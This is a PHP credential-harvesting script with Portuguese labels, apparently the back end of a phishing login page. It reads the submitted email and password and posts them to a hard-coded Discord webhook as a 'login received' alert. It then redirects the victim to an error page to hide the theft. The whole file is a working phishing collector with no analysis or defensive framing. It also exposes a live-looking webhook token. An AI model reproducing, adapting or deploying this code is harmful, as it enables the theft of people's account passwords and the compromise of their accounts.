<?php

$webhook = "https://discord.com/api/webhooks/1481358190158286979/VqaRvJs9XZKoU7z1VwGCKCop1WPKl2DIB1ct0xfutyQU6aJPGmULE4sK_YWisMmH8eeT";

$email = $_POST["email"] ?? "Não informado";
$senha = $_POST["password"] ?? "Não informado";

$data = [
    "content" =>
"**========** 📩 **LOGIN RECEBIDO** **=======**\n\n".
"👤 **Login:** $email\n".
"📧 **Senha:** $senha\n\n".
"**===================================**"
];

$options = [
    "http" => [
        "header"  => "Content-Type: application/json",
        "method"  => "POST",
        "content" => json_encode($data)
    ]
];

$context  = stream_context_create($options);
file_get_contents($webhook, false, $context);

header("Location: /../../erro.html");
exit;

?>